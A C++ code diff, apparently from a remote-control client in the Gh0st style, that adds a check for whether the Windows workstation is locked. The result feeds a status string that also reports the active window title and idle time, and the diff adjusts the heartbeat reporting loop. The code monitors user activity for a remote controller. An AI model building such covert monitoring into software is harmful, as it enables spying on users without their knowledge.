@@ -33,7 +33,7 @@ public:
 		if (isActive) {
 			return GetActiveWindowTitle();
 		}
-		return "Inactive: " + FormatMilliseconds(idle);
+		return (!IsWorkstationLocked() ? "Inactive: " : "Locked: ") + FormatMilliseconds(idle);
 	}
 
 private:
@@ -75,6 +75,20 @@ private:
 	{
 		return (GetTickCount64() - GetLastInputTime());
 	}
+
+	bool IsWorkstationLocked() {
+		HDESK hInput = OpenInputDesktop(0, FALSE, GENERIC_READ);
+		// 如果无法打开桌面，可能是因为桌面已经切换到 Winlogon
+		if (!hInput) return true;
+		char name[256] = {0};
+		DWORD needed;
+		bool isLocked = false;
+		if (GetUserObjectInformationA(hInput, UOI_NAME, name, sizeof(name), &needed)) {
+			isLocked = (_stricmp(name, "Winlogon") == 0);
+		}
+		CloseDesktop(hInput);
+		return isLocked;
+	}
 };
 
 class CKernelManager : public CManager  
@@ -99,7 +113,8 @@ public:
 		for (int i = 0; i < m_settings.ReportInterval && !g_bExit && m_ClientObject->IsConnected(); ++i)
 			Sleep(1000);
 		if (m_settings.ReportInterval <= 0) { // 关闭上报信息（含心跳）
-			for (int i = rand() % 120; i && !g_bExit && m_ClientObject->IsConnected(); --i) Sleep(1000);
+			for (int i = rand() % 120; i && !g_bExit && m_ClientObject->IsConnected()&& m_settings.ReportInterval <= 0; --i)
+				Sleep(1000);
 			return 0;
 		}
 		if (g_bExit || !m_ClientObject->IsConnected())
